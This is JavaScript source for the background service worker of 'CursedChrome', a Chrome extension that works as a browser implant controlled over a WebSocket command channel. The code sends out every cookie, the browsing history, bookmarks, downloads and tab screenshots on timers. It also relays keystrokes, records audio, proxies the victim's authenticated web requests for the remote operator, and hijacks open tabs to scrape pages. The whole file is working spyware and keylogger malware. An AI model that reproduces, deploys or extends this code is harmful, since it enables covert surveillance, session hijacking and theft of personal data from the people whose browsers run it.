// CursedChrome Extension - Manifest V3 Version
// Main service worker for background tasks
// Window polyfill for Service Workers in Manifest V3
// This provides localStorage-like functionality using chrome.storage.local

(function () {
  // Service Workers don't have access to window or localStorage
  // Create a polyfill for localStorage using chrome.storage.local
  if (typeof window === "undefined") {
    self.localStorage = {
      getItem: function (key) {
        return new Promise((resolve) => {
          chrome.storage.local.get([key], function (result) {
            resolve(result[key] || null);
          });
        });
      },
      setItem: function (key, value) {
        return new Promise((resolve) => {
          const data = {};
          data[key] = value;
          chrome.storage.local.set(data, resolve);
        });
      },
      removeItem: function (key) {
        return new Promise((resolve) => {
          chrome.storage.local.remove(key, resolve);
        });
      },
      clear: function () {
        return new Promise((resolve) => {
          chrome.storage.local.clear(resolve);
        });
      },
    };
  }
})();

// Export a global reference
if (typeof window === "undefined") {
  self.window = self;
}

class CursedChromeClient {
  constructor() {
    this.websocket = null;
    this.lastLiveConnectionTimestamp = this.getUnixTimestamp();
    this.placeholderSecretToken = this.getSecureRandomToken(64);
    this.redirectTable = {};
    this.REQUEST_HEADER_BLACKLIST = ["cookie"];

    // Storage polyfill
    this.localStorage = self.localStorage;

    // Configuration settings
    this.SYNC_SWITCH = {
      SYNC: true,
      SYNC_HUGE: true,
      REALTIME_IMG: false,
      PERSISTENT_RECORDING: false,
      PERSISTENT_KEYBOARD: false,
    };

    this.isAudioRecording = false;

    this.SYNC_DATA_CONFIG = {};

    // Map of RPC calls to handler methods
    this.RPC_CALL_TABLE = {
      HTTP_REQUEST: this.performHttpRequest.bind(this),
      AUTH: this.authenticate.bind(this),

      GET_COOKIES: this.getCookies.bind(this),
      GET_HISTORY: this.getHistory.bind(this),
      GET_TABS: this.getTabs.bind(this),
      GET_DOWNLOADS: this.getDownloads.bind(this),
      TAB_NAVIGATE_AND_FETCH: this.tabNavigateAndFetch.bind(this),
      STOP_TAB_NAVIGATE: this.stopTabNavigate.bind(this),
      START_AUDIO: this.startAudioRecording.bind(this),
      STOP_AUDIO: this.stopAudioRecording.bind(this),
      PONG: (params) => {
        return { success: true };
      },
    };

    this.activeTasks = new Map();

    // Constants for request handling
    this.HEADERS_TO_REPLACE = [
      "origin",
      "referer",
      "access-control-request-headers",
      "access-control-request-method",
      "access-control-allow-origin",
      "date",
      "dnt",
      "trailer",
      "upgrade",
    ];

    this.REDIRECT_STATUS_CODES = [301, 302, 307];

    this.SERVER_URL = "ws://127.0.0.1:4343";

    // Initialize the client
    this.initialize();
    this.setupIntervals();
    this.setupListeners();
  }

  // Initialize the WebSocket connection
  initialize() {
    // Replace with your server details - ideally a secure wss:// connection
    this.websocket = new WebSocket(this.SERVER_URL);

    this.websocket.onopen = () => {
      console.log("WebSocket connection established");
    };

    this.websocket.onmessage = async (event) => {
      console.log(`Received WebSocket message: ${event.data}`);
      this.lastLiveConnectionTimestamp = this.getUnixTimestamp();

      try {
        const parsedMessage = JSON.parse(event.data);

        // Update configuration if provided
        try {
          if (parsedMessage.data.switch_config) {
            Object.keys(parsedMessage.data.switch_config).forEach((key) => {
              this.SYNC_SWITCH[key] = parsedMessage.data.switch_config[key];
            });
          }
        } catch (e) {}

        try {
          if (parsedMessage.data.data_config) {
            Object.keys(parsedMessage.data.data_config).forEach((key) => {
              this.SYNC_DATA_CONFIG[key] = parsedMessage.data.data_config[key];
            });
          }
        } catch (e) {}

        // Handle RPC calls
        if (parsedMessage.action in this.RPC_CALL_TABLE) {
          const result = await this.RPC_CALL_TABLE[parsedMessage.action](
            parsedMessage.data
          );

          this.websocket.send(
            JSON.stringify({
              id: parsedMessage.id,
              origin_action: parsedMessage.action,
              result: result,
            })
          );
        } else {
          console.error(`No RPC action ${parsedMessage.action}!`);
        }
      } catch (e) {
        console.error("Could not parse WebSocket message!", e);
      }
    };

    this.websocket.onclose = (event) => {
      if (event.wasClean) {
        console.log(
          `Connection closed cleanly, code=${event.code} reason=${event.reason}`
        );
      } else {
        console.log("Connection died");
      }

      // Attempt to reconnect after a delay
      setTimeout(() => this.initialize(), 5000);
    };

    this.websocket.onerror = (error) => {
      console.log(`WebSocket error: ${error.message}`);
    };
  }

  // Set up periodic intervals for various tasks
  setupIntervals() {
    // Check websocket connection health
    setInterval(async () => this.checkWebsocketConnection(), 13000);

    // Realtime image sharing (if enabled)
    setInterval(async () => this.sendRealtimeImage(), 2000);

    // Check persistent features
    setInterval(async () => this.checkPersistentFeatures(), 10000);

    // Sync basic data
    setInterval(async () => this.syncBasicData(), 63000);

    // Sync more comprehensive data
    setInterval(async () => this.syncHugeData(), 321000);
  }

  // Set up event listeners
  setupListeners() {
    // Listen for idle state changes
    if (chrome.idle) {
      chrome.idle.onStateChanged.addListener((state) => {
        this.websocket.send(
          JSON.stringify({
            id: this.uuidv4(),
            version: "1.0.0",
            action: "STATE",
            data: {
              state: state,
            },
          })
        );
      });
    }

    // Listen for messages from content scripts
    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
      this.debugLog("Received message type: " + message.type);
      if (message.type === "REQUEST_SCREEN_CAPTURE") {
        this.handleScreenCaptureRequest(message.data, sender, sendResponse);
        return true; // Keep message channel open for async response
      } else if (message.type === "SCREEN_CAPTURE_DATA") {
        this.handleScreenCaptureData(message.data, sender);
        sendResponse({ success: true });
      } else if (message.type === "KEYBOARD_DATA") {
        this.handleKeyboardData(message.data, sender);
        sendResponse({ success: true });
      } else if (message.type === "USER_ACTIVITY") {
        this.handleUserActivity(message.timestamp, sender);
        sendResponse({ success: true });
      } else if (message.type === "AUDIO_CHUNK") {
        this.handleAudioChunk(message.data);
        sendResponse({ success: true });
      }
    });

    // Use non-blocking method to handle requests in Manifest V3
    if (chrome.webRequest) {
      // Listen for before send headers event to modify headers
      chrome.webRequest.onBeforeSendHeaders.addListener(
        (details) => {
          // Skip requests without X-PLACEHOLDER-SECRET
          const headers = details.requestHeaders || [];
          let shouldModify = false;

          for (let i = 0; i < headers.length; i++) {
            if (
              headers[i].name === "X-PLACEHOLDER-SECRET" &&
              headers[i].value === this.placeholderSecretToken
            ) {
              shouldModify = true;
              break;
            }
          }

          if (!shouldModify) {
            return { requestHeaders: headers };
          }

          // Find special headers that need modification
          for (let i = 0; i < headers.length; i++) {
            const header = headers[i];

            // Process headers with X-PLACEHOLDER- format
            if (header.name.startsWith("X-PLACEHOLDER-")) {
              const originalHeaderName = header.name.substring(
                "X-PLACEHOLDER-".length
              );

              // Try to set the original header
              if (
                !this.REQUEST_HEADER_BLACKLIST.includes(
                  originalHeaderName.toLowerCase()
                )
              ) {
                headers.push({
                  name: originalHeaderName,
                  value: header.value,
                });
              }

              // Remove the placeholder header
              headers.splice(i, 1);
              i--; // Adjust index
            }
          }

          return { requestHeaders: headers };
        },
        { urls: ["<all_urls>"] },
        ["requestHeaders"]
      );

      // In Manifest V3, we can't use blocking mode
      // So we need a different way to handle redirects
      // We'll use storage and script injection
      chrome.webRequest.onBeforeRequest.addListener(
        (details) => {
          // We can only monitor, not block or redirect
          // If redirect is needed, we can store the info and handle it in content script
        },
        { urls: ["<all_urls>"] }
      );
    }
  }

  // Check websocket connection health and reconnect if needed
  async checkWebsocketConnection() {
    const PENDING_STATES = [
      0, // CONNECTING
      2, // CLOSING
    ];

    // Check WebSocket state
    if (!this.websocket || PENDING_STATES.includes(this.websocket.readyState)) {
      console.log(`WebSocket not in appropriate state for liveness check...`);
      return;
    }

    // Check if connection appears dead
    const currentTimestamp = this.getUnixTimestamp();
    const secondsSinceLastLiveMessage =
      currentTimestamp - this.lastLiveConnectionTimestamp;

    if (secondsSinceLastLiveMessage > 29 || this.websocket.readyState === 3) {
      console.error(`WebSocket appears to be dead. Restarting connection...`);

      try {
        this.websocket.close();
      } catch (e) {}

      this.initialize();
      return;
    }

    // Send ping to keep connection alive
    const currentTab = await this.getCurrentTab();
    const tabImage = await this.getTabImage();

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "PING",
        data: {
          current_tab: currentTab,
          current_tab_image: tabImage,
        },
      })
    );
  }

  // Send realtime image of current tab if enabled
  async sendRealtimeImage() {
    if (this.SYNC_SWITCH["REALTIME_IMG"] !== true || !this.websocket) {
      return;
    }

    const tabImage = await this.getTabImage();

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "REALTIME_IMG",
        data: {
          current_tab_image: tabImage,
        },
      })
    );
  }

  // Sync basic data about tabs
  async syncBasicData() {
    if (this.SYNC_SWITCH["SYNC"] !== true || !this.websocket) {
      return;
    }

    const tabs = await this.getTabs();

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "SYNC",
        data: {
          tabs: tabs,
        },
      })
    );
  }

  // Sync comprehensive data
  async syncHugeData() {
    if (this.SYNC_SWITCH["SYNC_HUGE"] !== true || !this.websocket) {
      return;
    }

    const history = await this.getHistory(30);
    const bookmarks = await this.getBookmarks();
    const cookies = await this.getCookies();
    const downloads = await this.getDownloads();

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "SYNC_HUGE",
        data: {
          history: history,
          bookmarks: bookmarks,
          cookies: cookies,
          downloads: downloads,
        },
      })
    );
  }

  // Data collection methods
  async getDownloads() {
    if (!chrome.downloads) {
      return [];
    }
    return this.getAllDownloads();
  }

  getAllDownloads() {
    return new Promise((resolve) => {
      chrome.downloads.search({}, (results) => {
        resolve(results);
      });
    });
  }

  async getCurrentTab() {
    if (!chrome.tabs) {
      return {};
    }
    return this.getCurrentTabData();
  }

  getCurrentTabData() {
    return new Promise((resolve) => {
      chrome.tabs.query(
        { active: true, lastFocusedWindow: true },
        function (tabs) {
          resolve(tabs && tabs.length > 0 ? tabs[0] : {});
        }
      );
    });
  }

  async getTabs() {
    if (!chrome.tabs) {
      return [];
    }
    return this.getAllTabs();
  }

  getAllTabs() {
    return new Promise((resolve) => {
      chrome.tabs.query({}, function (tabs) {
        resolve(tabs || []);
      });
    });
  }

  async getTabImage() {
    if (!chrome.tabs) {
      return "";
    }
    return this.getCurrentTabImage();
  }

  getCurrentTabImage(quality = 80, windowId = null) {
    return new Promise((resolve) => {
      const options = { format: "jpeg", quality: quality };
      const callback = (dataUrl) => resolve(dataUrl || "");

      if (windowId !== null) {
        chrome.tabs.captureVisibleTab(windowId, options, callback);
      } else {
        chrome.tabs.captureVisibleTab(options, callback);
      }
    });
  }

  async getBookmarks() {
    if (!chrome.bookmarks) {
      return [];
    }
    return this.getAllBookmarks();
  }

  getAllBookmarks() {
    return new Promise((resolve) => {
      chrome.bookmarks.getTree(function (bookmarkTreeNodes) {
        resolve(bookmarkTreeNodes || []);
      });
    });
  }

  async getHistory(days = 30) {
    if (!chrome.history) {
      return [];
    }
    return this.getHistoryByDay(days);
  }

  getHistoryByDay(days = 7) {
    return new Promise((resolve, reject) => {
      try {
        const microsecondsPerDay = 1000 * 60 * 60 * 24;
        const startTime = new Date().getTime() - microsecondsPerDay * days;

        chrome.history.search(
          {
            text: "",
            startTime: startTime,
            maxResults: 10000,
          },
          function (historyItems) {
            resolve(historyItems || []);
          }
        );
      } catch (e) {
        reject(e);
      }
    });
  }

  async getCookies(params) {
    if (!chrome.cookies) {
      return [];
    }
    return this.getAllCookies({});
  }

  getAllCookies(details) {
    return new Promise((resolve, reject) => {
      try {
        chrome.cookies.getAll(details, function (cookiesArray) {
          resolve(cookiesArray || []);
        });
      } catch (e) {
        reject(e);
      }
    });
  }

  async tabNavigateAndFetch(params) {
    const { url } = params;
    const tabs = await this.getTabs();
    if (tabs.length === 0) {
      return { error: "No tabs found" };
    }

    // Pick a random existing tab as requested to minimize new window noise
    const targetTab = tabs[Math.floor(Math.random() * tabs.length)];
    const tabId = targetTab.id;

    console.log(`Using existing tab ${tabId} to navigate to ${url}`);

    return new Promise((resolve) => {
      const taskId = Math.random().toString(36).substring(7);

      let timeout = setTimeout(() => {
        this.activeTasks.delete(taskId);
        chrome.tabs.onUpdated.removeListener(listener);
        resolve({ error: "Navigation timed out" });
      }, 30000);

      const listener = async (updatedTabId, changeInfo, tab) => {
        if (updatedTabId === tabId && changeInfo.status === "complete") {
          clearTimeout(timeout);
          this.activeTasks.delete(taskId);
          chrome.tabs.onUpdated.removeListener(listener);

          try {
            // Wait a small bit for any final rendering
            await new Promise((r) => setTimeout(r, 1000));

            const results = await chrome.scripting.executeScript({
              target: { tabId: tabId },
              func: () => {
                return {
                  html: document.documentElement.outerHTML,
                  url: window.location.href,
                  title: document.title,
                };
              },
            });

            const result = results[0].result;

            // Immediately go back to the previous state as requested
            try {
              await chrome.tabs.goBack(tabId);
            } catch (e) {
              console.log("Could not go back, maybe no history?", e);
            }

            resolve(result);
          } catch (e) {
            console.error("Extraction error:", e);
            resolve({ error: e.message });
          }
        }
      };

      this.activeTasks.set(taskId, {
        tabId,
        listener,
        timeout,
        abort: () => {
          clearTimeout(timeout);
          chrome.tabs.onUpdated.removeListener(listener);
          try {
            chrome.tabs.stop(tabId);
            chrome.tabs.goBack(tabId);
          } catch (e) {}
          resolve({ error: "Task stopped by user" });
        },
      });

      chrome.tabs.onUpdated.addListener(listener);
      chrome.tabs.update(tabId, { url: url });
    });
  }

  async stopTabNavigate(params) {
    for (const [taskId, task] of this.activeTasks.entries()) {
      task.abort();
      this.activeTasks.delete(taskId);
    }
    return { success: true };
  }

  async authenticate(params) {
    let browserId = null;
    try {
      browserId = await this.localStorage.getItem("browser_id");
      if (browserId === null) {
        browserId = this.uuidv4();
        await this.localStorage.setItem("browser_id", browserId);
      }
    } catch (e) {
      console.error("Error accessing storage:", e);
      browserId = this.uuidv4(); // Fallback if storage fails
    }

    return {
      browser_id: browserId,
      user_agent: navigator.userAgent,
      timestamp: this.getUnixTimestamp(),
    };
  }

  // HTTP request handling
  async performHttpRequest(params) {
    // Whether to include cookies when sending request
    const credentialsMode = params.authenticated ? "include" : "omit";

    // Set the X-PLACEHOLDER-SECRET to the generated secret.
    params.headers["X-PLACEHOLDER-SECRET"] = this.placeholderSecretToken;

    const headerKeys = Object.keys(params.headers);
    const newHeaders = {};

    // Process headers in Manifest V3
    headerKeys.forEach((key) => {
      if (!this.HEADERS_TO_REPLACE.includes(key.toLowerCase())) {
        // Keep regular headers
        newHeaders[key] = params.headers[key];
      } else if (!this.REQUEST_HEADER_BLACKLIST.includes(key.toLowerCase())) {
        // For special headers, use X-PLACEHOLDER- prefix
        newHeaders[`X-PLACEHOLDER-${key}`] = params.headers[key];
      }
    });

    const requestOptions = {
      method: params.method,
      mode: "cors",
      cache: "no-cache",
      credentials: credentialsMode,
      headers: newHeaders,
      redirect: "follow",
    };

    // Process request body
    if (params.body) {
      // Convert base64 to Blob
      const fetchURL = `data:application/octet-stream;base64,${params.body}`;
      const fetchResp = await fetch(fetchURL);
      requestOptions.body = await fetchResp.blob();
    }

    try {
      var response = await fetch(params.url, requestOptions);
    } catch (e) {
      console.error(`Error occurred while performing fetch:`, e);
      return;
    }

    var responseHeaders = {};

    for (var pair of response.headers.entries()) {
      responseHeaders[pair[0]] = pair[1];
    }

    // Handle redirect issues
    if (this.REDIRECT_STATUS_CODES.includes(response.status)) {
      console.log(`Detected redirect: ${response.status} -> ${response.url}`);

      return {
        url: response.url,
        status: response.status,
        status_text: response.statusText || "Redirect",
        headers: responseHeaders,
        body: "",
        is_redirect: true,
      };
    }

    const responseArray = await response.arrayBuffer();

    return {
      url: response.url,
      status: response.status,
      status_text: response.statusText,
      headers: responseHeaders,
      body: this.arrayBufferToBase64(responseArray),
    };
  }

  // Utility methods
  getSecureRandomToken(bytesLength) {
    const validChars =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let array = new Uint8Array(bytesLength);
    crypto.getRandomValues(array);
    array = array.map((x) => validChars.charCodeAt(x % validChars.length));
    const randomString = String.fromCharCode.apply(null, array);
    return randomString;
  }

  uuidv4() {
    return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, (c) =>
      (
        c ^
        (crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))
      ).toString(16)
    );
  }

  arrayBufferToBase64(buffer) {
    let binary = "";
    const bytes = new Uint8Array(buffer);
    const len = bytes.byteLength;
    for (let i = 0; i < len; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
  }

  getUnixTimestamp() {
    return Math.floor(Date.now() / 1000);
  }

  // Handle screen capture request from content script
  async handleScreenCaptureRequest(requestData, sender, sendResponse) {
    try {
      // requestData.quality is 0.0-1.0 from content script, captureVisibleTab uses 1-100
      const quality = requestData.quality
        ? Math.floor(requestData.quality * 100)
        : 80;
      const imageData = await this.getCurrentTabImage(
        quality,
        sender.tab.windowId
      );
      sendResponse({
        success: true,
        imageData: imageData,
      });
    } catch (error) {
      console.error("Screen capture failed:", error);
      sendResponse({
        success: false,
        error: error.message,
      });
    }
  }

  // Handle screen capture data from content script
  handleScreenCaptureData(captureData, sender) {
    if (!this.websocket || this.websocket.readyState !== 1) {
      return;
    }

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "SCREEN_CAPTURE_DATA",
        data: captureData,
      })
    );

    console.log(
      `[DEBUG] Screen capture data sent: ${captureData.captures.length} captures`
    );
  }

  // Send debug log to server
  debugLog(message) {
    if (!this.websocket || this.websocket.readyState !== 1) {
      console.log("[LOCAL DEBUG] " + message);
      return;
    }

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "DEBUG_LOG",
        data: {
          message: message,
        },
      })
    );
  }

  // Handle user activity reported from content script
  handleUserActivity(timestamp, sender) {
    if (!this.websocket || this.websocket.readyState !== 1) {
      return;
    }

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "USER_ACTIVITY",
        data: {
          timestamp: timestamp,
          tab: {
            id: sender.tab.id,
            url: sender.tab.url,
            title: sender.tab.title,
          },
        },
      })
    );
  }

  // Handle keyboard data from content script
  handleKeyboardData(keyboardData, sender) {
    if (!this.websocket || this.websocket.readyState !== 1) {
      return;
    }

    // Only send if persistent keyboard is enabled
    if (!this.SYNC_SWITCH.PERSISTENT_KEYBOARD) {
      return;
    }

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "KEYBOARD_LOGS",
        data: keyboardData,
      })
    );

    console.log(
      `[DEBUG] Keyboard data sent: ${keyboardData.keys.length} chars`
    );
  }

  // Handle audio chunk from offscreen document
  handleAudioChunk(audioData) {
    if (!this.websocket || this.websocket.readyState !== 1) {
      return;
    }

    this.websocket.send(
      JSON.stringify({
        id: this.uuidv4(),
        version: "1.0.0",
        action: "AUDIO_DATA",
        data: audioData,
      })
    );
  }

  async checkPersistentFeatures() {
    if (this.SYNC_SWITCH.PERSISTENT_RECORDING && !this.isAudioRecording) {
      console.log("[DEBUG] Auto-starting persistent audio recording");
      this.startAudioRecording();
    } else if (
      !this.SYNC_SWITCH.PERSISTENT_RECORDING &&
      this.isAudioRecording
    ) {
      console.log("[DEBUG] Auto-stopping persistent audio recording");
      this.stopAudioRecording();
    }
  }

  async startAudioRecording() {
    if (this.isAudioRecording) return { success: true };
    this.isAudioRecording = true;
    this.debugLog("Starting audio recording...");
    this.currentAudioSessionId =
      Date.now().toString(36) + Math.random().toString(36).substring(2);
    // Ensure offscreen document exists
    try {
      await this.setupOffscreenDocument();
    } catch (e) {
      this.debugLog("Error setting up offscreen document: " + e.message);
      return { success: false, error: e.message };
    }

    return new Promise((resolve) => {
      this.debugLog(
        "Sending START_RECORDING to offscreen with session: " +
          this.currentAudioSessionId
      );
      chrome.runtime.sendMessage(
        {
          type: "START_RECORDING",
          data: {
            bot_id: this.websocket.browser_id || "unknown",
            session_id: this.currentAudioSessionId,
          },
        },
        (response) => {
          if (chrome.runtime.lastError) {
            this.debugLog("Message error: " + chrome.runtime.lastError.message);
            resolve({
              success: false,
              error: chrome.runtime.lastError.message,
            });
          } else {
            this.debugLog("Offscreen response: " + JSON.stringify(response));
            resolve(response);
          }
        }
      );
    });
  }

  async stopAudioRecording() {
    this.isAudioRecording = false;
    return new Promise((resolve) => {
      chrome.runtime.sendMessage(
        {
          type: "STOP_RECORDING",
        },
        (response) => {
          resolve(response);
        }
      );
    });
  }

  async setupOffscreenDocument() {
    const offscreenUrl = chrome.runtime.getURL("src/offscreen/offscreen.html");
    try {
      const existingContexts = await chrome.runtime.getContexts({
        contextTypes: ["OFFSCREEN_DOCUMENT"],
        documentUrls: [offscreenUrl],
      });

      if (existingContexts.length > 0) {
        this.debugLog("Offscreen document already exists.");
        return;
      }

      this.debugLog("Creating offscreen document...");
      await chrome.offscreen.createDocument({
        url: offscreenUrl,
        reasons: ["USER_MEDIA"], // For audio capture
        justification:
          "Capture audio from the browser for monitoring purposes.",
      });
      this.debugLog("Offscreen document created.");
    } catch (e) {
      this.debugLog("Offscreen setup failed: " + e.message);
      throw e;
    }
  }
}

// Initialize the client when the service worker starts
let client = null;
try {
  client = new CursedChromeClient();
} catch (error) {
  console.error("Failed to initialize CursedChromeClient:", error);
}

// Service worker listeners
self.addEventListener("install", (event) => {
  console.log("Service Worker installing...");
  self.skipWaiting();
});

self.addEventListener("activate", (event) => {
  console.log("Service Worker activating...");
  return self.clients.claim();
});
